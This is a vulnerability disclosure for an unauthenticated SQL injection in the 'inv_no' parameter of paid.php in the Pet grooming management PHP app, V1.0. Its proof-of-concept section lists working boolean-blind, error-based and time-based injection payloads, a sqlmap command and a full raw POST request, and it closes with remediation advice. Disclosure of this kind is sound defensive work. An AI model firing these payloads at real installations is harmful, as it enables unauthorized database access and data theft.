# Pet grooming management paid.php sql injection

# NAME OF AFFECTED PRODUCT(S)

- Pet grooming management

## Vendor Homepage

- [Pet grooming management software download | SourceCodester](https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html)

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- mel0dy

## VERSION(S)

- V1.0

## Software Link

- [Downloading Pet grooming management software download Code | SourceCodester](https://www.sourcecodester.com/download-code?nid=18340&title=Pet+grooming+management+software+download)

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in the 'paid.php' file of the 'Pet grooming management' project. The reason for this issue is that attackers inject malicious code from the parameter "inv_no" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Pet grooming management", discovered a critical SQL injection vulnerability in the "paid.php" file. This vulnerability stems from insufficient user input validation of the 'inv_no' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability type:

- error-based
- boolean-based blind
- time-based blind

## Vulnerability location:

- 'inv_no' parameter

## Payload:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: inv_no=1'+(SELECT 0x49446859 WHERE 6082=6082 AND 1300=1300)+'&insta_amt=100&due_total=50&ptype=test
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: inv_no=1'+(SELECT 0x65745972 WHERE 2912=2912 AND GTID_SUBSET(CONCAT(0x716a627a71,(SELECT (ELT(9337=9337,1))),0x71786b7671),9337))+'&insta_amt=100&due_total=50&ptype=test
    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: inv_no=1'+(SELECT 0x52495144 WHERE 2362=2362 AND (SELECT 7578 FROM (SELECT(SLEEP(5)))OMbl))+'&insta_amt=100&due_total=50&ptype=test
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
```

![image-20250902151831232](assets/image-20250902151831232.png)

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```
python sqlmap.py -r data.txt --dbs -v 3 --batch --level 5
//data.txt
POST /admin/operation/paid.php HTTP/1.1
Host: 192.168.31.222:8883
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: UserName=test1; PassWord=16d7a4fca7442dda3ad93c9a726597e4; Bus_Booking_System=bq1kveujc3osm8re7oiikt4hhj; columns-customers_view={%22customers-fullname%22:true%2C%22customers-phone%22:true%2C%22customers-id_number%22:true}; PHPSESSID=p1oiu687ec8r1n6qnj58qo4850
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

inv_no=1*&insta_amt=100&due_total=50&ptype=test
```

# Attack results

![image-20250902151901605](assets/image-20250902151901605.png)

# Suggested repair



1. **Use prepared statements and parameter binding:** Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. **Input validation and filtering:** Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Minimize database user permissions:** Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. **Regular security audits:** Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.